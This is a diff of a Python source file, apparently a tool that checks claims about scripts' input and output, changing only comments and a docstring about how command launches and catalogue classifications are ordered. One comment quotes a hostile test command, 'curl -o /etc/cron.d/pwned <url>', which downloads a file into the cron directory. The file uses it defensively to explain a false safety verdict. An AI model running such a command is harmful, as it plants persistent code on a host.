@@ -363,10 +363,10 @@ OPAQUE_BOUNDARIES: frozenset[str] = opacity_names(catalog_declarable=True)
 # environment and host-info rows, no command rows), so that guard is gone;
 # command launches stay opaque because verify_claims asks the producer stamp
 # FIRST (``_is_producer_stamped_launch``, asked by ``_opaque_launch_sites``
-# and by ``_adjudicate_external_modules``, which backs
-# ``_uncatalogued_external_modules``), even when a catalogue row would also
-# classify the call. The history that motivated that order, measured
-# on the shipped CLI over a two-line script whose only command is
+# and by ``_adjudicate_external_modules``, the coverage gate's walk), even
+# when a catalogue row would also classify the call. The history that
+# motivated that order, measured on the shipped CLI over a two-line script
+# whose only command is
 # ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
 # filesystem": with no bash.yaml, ``inconclusive`` rc 2; with a six-line
 # ``curl -> net_send`` bash.yaml, ``confirmed`` rc 0 — a green tick over a write
@@ -5507,7 +5507,7 @@ def classify_call(
 
     THE ONE ANSWER TO "DID THE CATALOGUE CLASSIFY THIS CALL", consumed by
     :func:`tag_io_boundaries` (which stamps the result onto the edge) and by
-    ``verify_claims._uncatalogued_external_modules`` (which treats a classified
+    ``verify_claims._adjudicate_external_modules`` (which treats a classified
     call as EXAMINED). Those two were about to disagree, and the disagreement
     would have been a false safety claim in both directions at once.
 
